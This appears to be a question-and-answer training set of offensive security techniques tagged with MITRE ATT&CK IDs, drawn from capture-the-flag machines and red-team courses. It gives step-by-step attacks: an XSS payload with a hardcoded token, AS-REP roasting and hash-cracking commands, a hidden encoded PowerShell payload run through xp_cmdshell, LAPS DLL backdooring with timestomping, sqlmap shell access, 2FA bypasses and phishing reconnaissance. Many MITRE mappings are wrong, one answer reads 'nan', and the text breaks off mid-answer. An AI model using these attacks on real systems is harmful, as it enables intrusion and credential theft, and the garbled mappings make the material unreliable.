A: To exploit an XSS vulnerability to gain a foothold on a Windows system, follow these steps:1. Identify an XSS vulnerability in the application, such as the one in the `RequestCard` component that uses the outdated `react-marked-markdown` library.2. Construct a malicious payload that will execute your script when the vulnerable component is rendered:   ```javascript   [XSS](javascript: document.write`<script>   const xhr = new XMLHttpRequest();   xhr.open('GET', 'https://cereal.htb/requests/1');   xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjE4NDQ5MjQsImV4cCI6MTYyMjQ0OTcyNCwiaWF0IjoxNjIxODQ0OTI0fQ.CpORKrMxIdStpxegLX6F9k37g9-2OkpVBms459264rM');   xhr.send();   </script>`)   ```3. The script sends an authenticated request to the `/requests/{id}` endpoint, triggering the deserialization vulnerability and downloading a web shell.4. Access the web shell at `https://source.cereal.htb/uploads/21098374243-cmd.aspx` to execute commands on the server.This technique allows you to leverage the XSS vulnerability to gain a foothold on the Windows system by exploiting the underlying deserialization vulnerability. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: How can you bypass 2FA by accessing the subsequent endpoint directly?
A: To bypass 2FA, access the subsequent endpoint directly, knowing the path is crucial. If unsuccessful, alter the Referrer header to mimic navigation from the 2FA verification page. MITRE References: MITRE ID is T1189, MITRE Name is: Proxy, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by reusing previously used tokens for authentication within an account?
A: Reutilizing previously used tokens for authentication within an account can be effective. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by using an unused token extracted from one's own account?
A: Extracting a token from one's own account to bypass 2FA in another account can be attempted. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting the exposure of the token?
A: Investigate whether the token is disclosed in a response from the web application. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting the email verification link sent upon account creation?
A: Using the email verification link sent upon account creation can allow profile access without 2FA, as highlighted in a detailed post. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting session manipulation?
A: Initiating sessions for both the user's and a victim's account, and completing 2FA for the user's account without proceeding, allows an attempt to access the next step in the victim's account flow, exploiting backend session management limitations. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting the password reset mechanism?
A: Investigating the password reset function, which logs a user into the application post-reset, for its potential to allow multiple resets using the same link is crucial. Logging in with the newly reset credentials might bypass 2FA. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting a compromised OAuth platform account?
A: Compromising a user's account on a trusted OAuth platform (e.g., Google, Facebook) can offer a route to bypass 2FA. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA using brute force attacks when there is no rate limit?
A: The lack of a limit on the number of code attempts allows for brute force attacks, though potential silent rate limiting should be considered. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA using a slow brute force attack when there are flow rate limits?
A: A slow brute force attack is viable where flow rate limits exist without an overarching rate limit. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by resetting the code resend limit?
A: Resending the code resets the rate limit, facilitating continued brute force attempts. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass client-side rate limiting to bypass 2FA?
A: A document details techniques for bypassing client-side rate limiting. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting the lack of rate limiting on internal account actions?
A: Rate limits may protect login attempts but not internal account actions. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting the infinite OTP regeneration?
A: Endless OTP generation with simple codes allows brute force by retrying a small set of codes. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting race conditions?
A: Exploiting race conditions for 2FA bypass can be found in a specific document. MITRE References: MITRE ID is T1480, MITRE Name is: Environmental Keying, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting CSRF or Clickjacking vulnerabilities?
A: Exploring CSRF or Clickjacking vulnerabilities to disable 2FA is a viable strategy. MITRE References: MITRE ID is T1600, MITRE Name is: Weaken Encryption, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting the 'Remember Me' feature?
A: Guessing the "remember me" cookie value or impersonating the victim's IP address through the X-Forwarded-For header can bypass restrictions. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by using older versions of the application?
A: Testing subdomains or older API versions indicated by /v*/ directory paths may be vulnerable to 2FA bypass methods. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting flaws in the handling of previous sessions?
A: Terminating existing sessions upon 2FA activation secures accounts against unauthorized access from compromised sessions. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting access control flaws with backup codes?
A: Immediate generation and potential unauthorized retrieval of backup codes upon 2FA activation, especially with CORS misconfigurations/XSS vulnerabilities, poses a risk. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA by exploiting information disclosure on the 2FA page?
A: Sensitive information disclosure (e.g., phone number) on the 2FA verification page is a concern. MITRE References: MITRE ID is T1531, MITRE Name is: Account Access Removal, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass 2FA using decoy requests to obfuscate brute force attempts or mislead rate limiting mechanisms?
A: Utilizing decoy requests to obfuscate brute force attempts or mislead rate limiting mechanisms adds another layer to bypass strategies. Crafting such requests requires a nuanced understanding of the application's security measures and rate limiting behaviors. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an attacker use Rubeus to perform AS-REP Roasting and obtain Kerberos hashes for accounts with Kerberos pre-authentication disabled?
A: The attacker can use the 'asreproast' module in Rubeus v2.0.4 to perform AS-REP Roasting. The command to do this is:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

This will search for users with Kerberos pre-authentication disabled, and obtain the AS-REP hash for the 'svc_oracle' account, which can then be cracked offline to recover the plaintext password. MITRE References: MITRE ID is T1558.004, MITRE Name is: Kerberoasting, and MITRE Tactics are: CredentialAccess, PrivilegeEscalation.

## Q: How can an attacker crack the AS-REP hash obtained through AS-REP Roasting?
A: The attacker can use tools like John the Ripper or Hashcat to crack the AS-REP hash obtained through AS-REP Roasting. For John the Ripper, the command would be:

root@kali:~# john --format=krb5asrep --wordlist=wordlist svc_oracle

This will attempt to crack the AS-REP hash for the 'svc_oracle' account using the provided wordlist. Alternatively, for Hashcat, the command would be:

-a 0 -m 18200 svc_oracle wordlist

This uses the 'krb5asrep23' hash mode (18200) to crack the AS-REP hash. MITRE References: MITRE ID is T1110.002, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: CredentialAccess.

## Q: How can Firefox and the FoxyProxy extension be used to pivot a browser into a network and view internal web applications?
A: Firefox with the FoxyProxy extension can be used to pivot a browser into a network and view internal web applications. First, add a new entry in FoxyProxy that points to the Beacon SOCKS proxy. Then, navigate to an internal host on the network to access and view the internal web applications. MITRE References: MITRE ID is T1090, MITRE Name is: Connection Proxy, and MITRE Tactics are: Lateral Movement.

## Q: How can an attacker backdoor the Get-AdmPwdPassword cmdlet in the LAPS PowerShell module to log the password to a file?
A: To backdoor the Get-AdmPwdPassword cmdlet in the LAPS PowerShell module:
1. Obtain the source code for the LAPS module from https://github.com/GreyCorbel/admpwd.
2. Modify the `ProcessRecord()` method of the `GetPassword` class to append the computer name and password to a file (e.g. `C:\Temp\LAPS.txt`).
3. Compile the modified project and replace the original `AdmPwd.PS.dll` file on the target system.
4. Use the `timestomp` Beacon command to update the timestamp of the backdoored DLL to match the original. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can a Beacon payload be executed on a SQL server using xp_cmdshell?
A: To execute a Beacon payload on a SQL server using xp_cmdshell, you can use a PowerShell one-liner like `EXEC xp_cmdshell 'powershell -w hidden -enc <base64_encoded_payload>';`. However, be aware that there are limitations on the command length that can be passed directly in the SQL query, and the SQL server may not be able to reach your Kali IP directly. In these cases, you'll need to use techniques like reverse port forwarding and pivot listeners to successfully deploy the payload. MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: Execution, Lateral Movement.

## Q: How can the Cobalt Strike 'ppid' command be used to set the parent process for Beacon post-exploitation capabilities?
A: Cobalt Strike's 'ppid' command can be used to set the parent process for all Beacon post-exploitation capabilities that spawn a process, such as 'shell', 'run', 'execute-assembly', and 'shspawn'. By default, Beacon will use itself as the parent process, but running 'ppid' with a target process ID will cause the spawned processes to appear as children of the specified parent. This can be useful for evading detection by security monitoring tools. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can a writeable software share on a domain controller be leveraged for code execution?
A: A writeable software share on a domain controller can be leveraged to upload a malicious payload and use Group Policy to create a registry autorun value to execute it on system startup. The Set-GPPrefRegistryValue cmdlet in the GroupPolicy PowerShell module can be used to configure a registry preference item under the Computer Configuration to execute the payload. MITRE References: MITRE ID is T1583.003, MITRE Name is: Acquire Infrastructure: Server, and MITRE Tactics are: Resource Development.

## Q: What is the purpose of the Cobalt Strike Resource Kit?
A: The Cobalt Strike Resource Kit contains templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA. It provides templates that can be used to generate malicious code for various attack scenarios. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Delivery.

## Q: How can weak FTP credentials be leveraged to gain initial access to a target system?
A: Weak FTP credentials can be leveraged to gain initial access by attempting anonymous login or trying common username and password combinations. If successful, the attacker can then upload malicious files, such as an ASP.NET reverse shell, and execute them on the target system to gain remote access. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What are some common techniques for privilege escalation on Windows systems?
A: Common techniques for privilege escalation on Windows systems include using the Metasploit module `exploit/windows/local/bypassuac_eventvwr` to bypass UAC, and the `exploit/windows/local/ms10_015_kitrap0d` module to exploit the KiTrap0D vulnerability. Running the `local_exploit_suggester` module in Metasploit can also provide reliable suggestions for privilege escalation based on the target system's architecture. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: How can Mimikatz be used to dump Kerberos encryption keys from a Windows host?
A: The Mimikatz module `sekurlsa::ekeys` can be used to dump Kerberos encryption keys from a Windows host. This requires local admin privileges on the host. The keys obtained, such as the `aes256_hmac` and `aes128_hmac` keys, can then be used with the Overpass the Hash technique to authenticate as the user without providing the cleartext password. MITRE References: MITRE ID is T1003.001, MITRE Name is: Credential Dumping: Credential API Impersonation, and MITRE Tactics are: Credential Access.

## Q: What are some common payloads an attacker could send from a compromised internal mailbox?
A: Some common payloads an attacker could send from a compromised internal mailbox include:- Malware or other malicious files/links disguised as legitimate documents or communications- Phishing emails targeting other employees to gain further access- Requests for sensitive information or credentials- Notifications about a 'security issue' that tricks users into taking harmful actions MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control.

## Q: What are some common social engineering and phishing tactics that can be used to gain access to a target environment?
A: Some common social engineering and phishing tactics include:- Leveraging information from sites like LinkedIn to gather personal and professional details about targets, which can be used to craft convincing pretexts and lure targets into performing desired actions.- Using generic or targeted pretexts that play on emotions like fear, urgency, greed, and curiosity to increase the likelihood of a target opening an email and performing the desired actions.- Crafting pretext emails that appear to be from legitimate sources like HR or finance departments, containing urgent notices or requests.- Using Google dorks like "site:linkedin.com '<company name>'" to quickly scrape LinkedIn for employee information that can be used in phishing campaigns. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access, Execution.

## Q: How can an external reconnaissance be conducted against the lab targets at https://cyberbotic.io to gather information for a phishing campaign?
A: To conduct external reconnaissance against the lab targets at https://cyberbotic.io, the following steps can be performed:1. Use search engines and web scraping tools to gather publicly available information about the company and its employees, such as:   - Company website   - Social media profiles (LinkedIn, Twitter, etc.)   - Press releases and news articles   - Job postings and employee directories2. Identify key employees or departments (e.g., HR, finance, IT) that could be targeted in a phishing campaign.3. Gather personal and professional details about the identified targets, such as:   - Names   - Job titles and responsibilities   - Contact information (email addresses, phone numbers)   - Interests and hobbies4. Leverage the gathered information to craft convincing and targeted phishing emails or messages that play on the emotions and interests of the targets. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Reconnaissance.

## Q: What is the purpose of the startup folder in Windows and how can it be used for persistence?
A: The startup folder in Windows is a location where applications, files, and shortcuts are automatically launched when the user logs in. This is commonly used to set up the user's home environment, such as loading wallpapers or shortcuts. Malicious actors can abuse this functionality to achieve persistence on a target system by adding their own executable or script to the startup folder. The example command uses the SharPersist tool to add a PowerShell script to the startup folder that downloads and executes a payload from a remote server. MITRE References: MITRE ID is T1547.001, MITRE Name is: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can I use Metasploit to gain access to a target system?
A: To use Metasploit to gain access to a target system, you can follow these steps:1. Identify the target system's operating system and vulnerabilities using Nmap or other reconnaissance tools.2. Search the Metasploit database for an appropriate exploit module that targets the identified vulnerabilities.3. Configure the exploit module with the necessary options, such as the target's IP address and port.4. Launch the exploit module and establish a Meterpreter session with the target system.5. Use the Meterpreter shell to execute commands, upload/download files, and further explore and compromise the target system. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: What is one way to perform a buffer overflow attack?
A: nan MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you leverage Lua code injection in a bozohttpd web server to gain remote code execution?
A: The bozohttpd web server can be vulnerable to Lua code injection if it is configured to execute Lua scripts. By crafting a malicious URL parameter, you can inject Lua code that will be executed by the server, allowing you to run commands on the host. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you abuse the doas command on a NetBSD system to escalate privileges to root?
A: The doas command on NetBSD is similar to the sudo command on other Unix-like systems. If the doas.conf file is misconfigured to allow the current user to execute commands as root, you can use the doas command to elevate your privileges and gain a root shell. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0004.

## Q: What is the TicketTrick attack and how can it be used to gain access to internal services?
A: The TicketTrick attack is a technique that allows a non-authenticated user to gain access to a temporary company email address. This is often possible in support ticketing systems like osTicket that allow users to contact the help desk using a company email address. By creating a support ticket, the system will generate a temporary company email address for the user. This email address can then be used to sign up for internal services like Slack, Confluence, or GitHub, which may grant access based on the company email address. The TicketTrick attack can be used to gain an initial foothold into the internal network. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, TA0009.

## Q: How can you use password cracking techniques to escalate privileges on a system?
A: To escalate privileges using password cracking techniques, you can follow these steps:1. Locate password hashes in the system, such as in database configuration files or password databases.2. Generate a wordlist based on common password patterns or variations of known passwords, using tools like Hashcat.3. Use a password cracking tool like John the Ripper (version 1.9.0) to crack the password hashes using the generated wordlist.4. Once the password is cracked, you can use it to log in as the corresponding user and elevate your privileges. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you exploit the CVE-2020-7384 vulnerability in Metasploit Framework to gain initial access to a target system?
A: To exploit the CVE-2020-7384 vulnerability in Metasploit Framework (versions <= 6.0.11), you can use the Metasploit module `exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`. This module allows you to generate a malicious APK template file that can be uploaded to the target system through a vulnerable web application and execute arbitrary commands. Set the `LHOST` and `LPORT` options to your listening IP and port, and run the module to generate the malicious payload. Then, upload the generated `msf.apk` file to the target system and trigger the vulnerability to obtain a reverse shell connection. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you leverage directory enumeration and file read to forge cookies and login as an administrator?
A: To leverage directory enumeration and file read to forge cookies and login as an administrator, you can follow these steps:1. Perform directory enumeration on the web application using a tool like Gobuster to find interesting directories and files.2. Identify any files that may contain session or authentication related code, such as cookie.php.3. Review the code to understand how the session ID is generated, such as using a custom function like makesession() that combines the username with a secret key.4. Write a script to forge a valid session ID for the admin user by following the session ID generation logic.5. Replace the session cookie in the browser with the forged value and access the admin functionality. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: TA0007.

## Q: How can you leverage an unrestricted file upload vulnerability to gain a foothold on the system?
A: To leverage an unrestricted file upload vulnerability to gain a foothold on the system, you can follow these steps:1. Identify the file upload functionality in the web application and intercept the request in a tool like Burp Suite.2. Analyze the server-side validation logic to determine if there are any weaknesses, such as a lack of file type or content validation.3. Craft a malicious payload, such as a PHP web shell, and upload it to the server.4. Execute the web shell to gain command execution on the server and establish a reverse shell connection. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0006.

## Q: How can you leverage SQLi to escalate privileges to the Windows Administrator user?
A: To leverage SQLi to escalate privileges to the Windows Administrator user, you can follow these steps:1. Identify a SQL injection vulnerability in the application, such as in a query that retrieves data from a database.2. Use union-based SQLi techniques to enumerate the database schema and discover sensitive information, such as stored credentials.3. Locate the administrator's hashed password in the database and attempt to crack it using a tool like John the Ripper.4. Log in to the system as the administrator user to gain full control. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0009, TA0004.

## Q: How can you further investigate the SAP router's configuration to potentially reveal internal network details?
A: Use the Metasploit module `sap_router_info_request` to gather more information about the SAP router configuration:```msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101msf auxiliary(sap_router_info_request) > run``` MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: Discovery.

## Q: How can a malicious package be installed on a FreeBSD system to gain root privileges?
A: On FreeBSD, the pkg command is used to manage packages. If the user has write access to the /etc/hosts file and can modify the default repository URL, they can create a malicious package and install it using sudo privileges. This can be done by creating a custom package with a post-install script that adds the user to the sudoers file, then updating the pkg repository and installing the malicious package. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are the steps to exploit prototype pollution vulnerability in a Node.js application?
A: To exploit a prototype pollution vulnerability in a Node.js application:1. Identify the code that is vulnerable to prototype pollution, often where user input is passed to the __proto__ property.2. Craft a payload that will append malicious properties to the Object.prototype, such as {"__proto__":{"canUpload":true}}.3. Send the payload to the vulnerable endpoint, bypassing any access control checks that rely on the malicious property.4. Use the gained privileges to perform further attacks, such as command injection or privilege escalation. MITRE References: MITRE ID is T1189, MITRE Name is: Component Abuse, and MITRE Tactics are: TA0004, TA0005.

## Q: How can you leverage Kubernetes RBAC (Role-Based Access Control) to gain escalated privileges on a cluster?
A: To escalate privileges on a Kubernetes cluster by exploiting RBAC:1. Enumerate the RBAC permissions of the current service account using 'kubectl auth can-i --list'.2. Identify a service account with elevated permissions, such as the ability to list or get secrets in the kube-system namespace.3. Obtain the service account token and certificate authority by reading the files in the '/run/secrets/kubernetes.io/serviceaccount' directory.4. Use the elevated service account token to interact with the Kubernetes API and perform privileged actions, such as creating malicious pods that can escape the container and access the host system. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004, TA0005.

## Q: How can you perform a command injection attack in a Node.js application by exploiting a vulnerable library?
A: To perform a command injection attack in a Node.js application by exploiting a vulnerable library:1. Identify a vulnerable library that uses the 'exec' function to execute external commands, such as the 'google-cloudstorage-commands' package.2. Craft a payload that injects your malicious command into the arguments passed to the 'exec' function.3. Send the payload to the vulnerable endpoint, triggering the execution of your malicious command and gaining a reverse shell. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0004, TA0005.

## Q: How can you leverage PostgreSQL SQL injection to achieve remote code execution in a Docker container?
A: To leverage PostgreSQL SQL injection for remote code execution in a Docker container, you can use the --os-shell option in sqlmap. First, capture the login request in Burp Suite and save it to a file. Then, run the following sqlmap command to attempt to gain a shell:

sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl --os-shell

This will attempt to execute a reverse shell on the container through the SQL injection vulnerability. Once you have a shell, you can further escalate privileges by exploiting the Docker Toolbox default credentials and accessing the host filesystem. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you exploit a vulnerability in the signature validation of the Electron auto-updater to achieve remote command execution?
A: The Electron auto-updater used in the Atom application has a vulnerability in the signature validation process that can be exploited to achieve remote command execution. By crafting a malicious update definition file (latest.yml) that contains a single quote (') in the file name, the signature validation can be bypassed, allowing the application to download and execute a malicious executable. To exploit this, create a malicious executable using a tool like msfvenom, calculate the SHA512 hash, and update the latest.yml file with the malicious file details. Then, upload the malicious files to a location accessible by the Atom application, such as an SMB share. When the Atom application checks for updates, it will download and execute the malicious executable, providing a shell as the user 'jason'. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you leverage the Redis service to escalate privileges from the 'jason' user to the 'Administrator' user?
A: To escalate privileges from the 'jason' user to the 'Administrator' user, you can leverage the Redis service running on the target system. First, locate the Redis configuration file (e.g., C:\Program Files\Redis\redis.windows-service.conf) to retrieve the Redis password, which is stored in the 'requirepass' parameter. Use the retrieved password to authenticate to the Redis service using the 'redis-cli' tool. Then, explore the Redis database and locate the keys related to the 'Administrator' user, which should include an 'EncryptedPassword' field. Use a script to decrypt the 'EncryptedPassword' value using the hardcoded DES key and IV values for the PortableKanban application, which can be found online. This will reveal the 'Administrator' user's password, allowing you to log in to the system using the WinRM service. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use the PortableKanban software to decrypt the 'Administrator' user's password?
A: The PortableKanban software uses a hardcoded DES key and IV values to encrypt and decrypt user passwords. By downloading the PortableKanban software and extracting the encrypted 'Administrator' user password from the 'PortableKanban.pk3' file, you can write a script to decrypt the password using the known key and IV values. The script should use the 'des' Python library to perform the decryption and reveal the 'Administrator' user's password, which can then be used to log in to the system using the WinRM service. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can we leverage the CAP_SYS_MODULE capability in Docker to escalate privileges on the host system?
A: If the Docker container is granted the CAP_SYS_MODULE capability, we can create a malicious kernel module and load it onto the host system to gain root privileges. This involves compiling a reverse shell module, copying it into the container, and then using insmod to load the module onto the host kernel. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is the technique used to exploit the authenticated remote code execution vulnerability in the voting system application?
A: The authenticated remote code execution vulnerability in the voting system application can be exploited by modifying the exploit code to include the correct IP address, username, password, and reverse shell details. The exploit sends a malicious payload to the 'voters_add.php' page, which allows the attacker to execute arbitrary code on the target system as the 'phoebe' user. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can the SSRF vulnerability in the file scanner application be exploited to gain access to the internal password manager?
A: The SSRF vulnerability in the file scanner application can be exploited by entering 'http://127.0.0.1:5000/' in the URL field, which allows the attacker to access the internal password manager running on port 5000. This reveals the credentials for the 'OMRS admin' account, which can then be used to log into the voting system application. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: InitialAccess, PrivilegeEscalation.

## Q: How can you enumerate metadata of PDFs to find potential usernames to target?
A: We can download all the PDFs from the FTP server and use tools like exiftool to extract the metadata, which may contain information about the publisher or author of the PDFs. This metadata can provide potential user accounts to target for further enumeration (T1083 - File and Directory Discovery). MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you abuse Kerberos preauth being disabled to obtain a TGT hash for a user account?
A: If Kerberos preauth is disabled for a user account, you can use the GetNPUsers.py script from the Impacket tools (version 0.9.22) to request a TGT for that user without needing the password. The TGT hash can then be cracked offline using a tool like Hashcat (version 6.2.5) to obtain the user's password (T1558 - Steal or Forge Kerberos Tickets). MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Credential Access.

## Q: How can you leverage MSSQL for remote code execution after obtaining service account credentials?
A: After obtaining valid MSSQL service account credentials, you can use tools like mssqlclient.py from Impacket (version 0.9.22) or mssql_shell.py to connect to the MSSQL server and enable xp_cmdshell to execute arbitrary commands on the host (T1047 - Windows Management Instrumentation, T1055 - Process Injection). MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: Execution.

## Q: How can you extract credentials from a KeePass database and use them to gain further access?
A: After obtaining a KeePass database file, you can use tools like keepass2john to convert it to a hash file that can be cracked with John the Ripper (version 1.9.0) using a wordlist. Once the master password is obtained, you can open the KeePass database and extract any stored credentials to use for further access (T1555 - Credentials from Password Stores). MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: Credential Access.

## Q: How can you abuse the SEImpersonatePrivilege to escalate privileges using PrintSpoofer?
A: If a user account has the SEImpersonatePrivilege, you can use tools like PrintSpoofer (version 1.0) to exploit this privilege and impersonate the SYSTEM user, allowing you to execute commands with elevated privileges (T1134 - Access Token Manipulation, T1055 - Process Injection). MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you abuse a DCSync attack to dump credentials and escalate privileges?
A: By forging a TGT ticket using a service account and leveraging Impacket's secretsdump.py, you can perform a DCSync attack to dump the NTLM hashes of the domain, which can then be used to impersonate users and escalate privileges (T1003 - OS Credential Dumping, T1558 - Steal or Forge Kerberos Tickets). MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can a backdoored version of PHP be leveraged to obtain a foothold on a server?
A: The PHP 8.1.0-dev version was released with a known backdoor vulnerability that can be exploited to execute arbitrary code on the server. The vulnerability checks the User-Agent header for the string "zerodium" and if found, it executes the code after that string. By sending a curl request with a crafted User-Agent header, it is possible to execute system commands and gain a reverse shell on the server. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use Metasploit to perform a buffer overflow attack?
A: To perform a buffer overflow attack using Metasploit, you can use the 'exploit/windows/stack/ms08_067_netapi' module. This module targets a vulnerability in the Windows Server service that allows remote code execution. You can set the 'RHOST' option to the target IP address and then run the 'exploit' command to launch the attack. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can Linux capabilities be leveraged to escalate privileges during a penetration test?
A: Linux capabilities can be used to grant specific privileges to a process without requiring full root (UID 0) access. If a binary has certain capabilities set, it can perform actions typically restricted to the root user. To leverage this:- Use a tool like linpeas to identify binaries with unusual capabilities set- Check the documentation for the specific capabilities (e.g. CAP_SETUID, CAP_NET_BIND_SERVICE)- Abuse the capabilities to perform privileged actions, such as spawning a root shell- For example, python3.8 with CAP_SETUID can be used to switch the process UID to 0 (root) MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can a wildcard injection vulnerability in a Bash script be exploited to gain root access?
A: A wildcard injection vulnerability in a Bash script can be exploited to gain root access. This can happen if the script uses a wildcard when copying files to a directory controlled by the root user. By creating specially crafted files with names that exploit the wildcard, an attacker can trick the script into copying a setuid version of Bash, which can then be used to escalate privileges to root. MITRE References: MITRE ID is T1216, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit the Xdebug configuration on the web server to execute commands remotely?
A: To exploit the Xdebug configuration, you can use the xdebug-shell tool. First, clone the repository from GitHub and install any required packages:

